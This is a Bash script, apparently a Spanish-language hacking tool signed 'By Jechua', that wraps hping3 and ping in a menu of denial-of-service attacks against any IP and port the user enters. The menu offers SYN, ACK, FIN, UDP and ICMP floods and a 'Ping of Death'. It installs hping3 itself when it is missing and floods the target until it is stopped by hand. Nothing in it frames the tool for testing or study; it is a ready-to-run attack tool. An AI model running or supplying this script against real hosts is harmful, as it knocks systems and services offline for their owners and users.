#!/bin/bash

if [[ "$EUID" -ne 0 ]]; then
  echo "Este script debe ejecutarse como root."
  exit 1
fi

if ! command -v hping3 &> /dev/null; then
  echo "hping3 no está instalado. Instalándolo..."
  apt update && apt install -y hping3
fi

while true; do
  clear
  cat << "EOF"
░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░              ░▒▓██████▓▒░░▒▓████████▓▒░      ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░        ░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░     
░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░       ░▒▓██████▓▒░░▒▓█▓▒░             ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░  ░▒▓█▓▒░     
EOF

  cat << "EOF"
                           ,___
                          / O\_\
                        _/   \_
                       /`\` '`\\
                      (  .\_  / \
                      /\    \(/  \
                     /'(/   /\(/ /
                    /''/(/ /\\\(/ 
                    ////  (/ """  By Jechua
EOF

  echo "Elije una opcion"
  echo "1. TCP SYN Flood"
  echo "2. TCP ACK Flood"
  echo "3. TCP FIN Flood"
  echo "4. UDP Flood"
  echo "5. ICMP Flood"
  echo "6. Ping of Death"
  echo "7. Salir"

  read -p "Selecciona una opción (1-7): " opcion

  # Validar la entrada
  if [[ "$opcion" =~ ^[1-7]$ ]]; then
    if [ "$opcion" -eq 7 ]; then
      echo "Saliendo del programa..."
      exit 0
    fi

    read -p "Ingresa la dirección IP objetivo: " ip
    read -p "Ingresa el puerto objetivo (escribe x para omitir): " puerto

    case $opcion in
      1)
        echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
        if [[ "$puerto" == "x" ]]; then
          hping3 -S $ip --flood
        else
          hping3 -S $ip -p $puerto --flood
        fi
        ;;
      2)
        echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
        if [[ "$puerto" == "x" ]]; then
          hping3 -A $ip --flood
        else
          hping3 -A $ip -p $puerto --flood
        fi
        ;;
      3)
        echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
        if [[ "$puerto" == "x" ]]; then
          hping3 -F $ip --flood
        else
          hping3 -F $ip -p $puerto --flood
        fi
        ;;
      4)
        echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
        if [[ "$puerto" == "x" ]]; then
          hping3 --udp $ip --flood
        else
          hping3 --udp -p $puerto $ip --flood
        fi
        ;;
      5)
        echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
        hping3 --icmp $ip --flood
        ;;
      6)
        read -p "¿Cuál es el tamaño de los bytes que quieres enviar? (máx recomendado: 65500): " tam
        echo "PRESIONA CTRL+C PARA DETENER EL ATAQUE EN CUALQUIER MOMENTO!!!!."
        ping -s $tam -f $ip
        ;;
    esac
  else
    echo "Opción no válida, imbécil. Por favor, selecciona un número entre 1 y 7."
    sleep 2
  fi
done
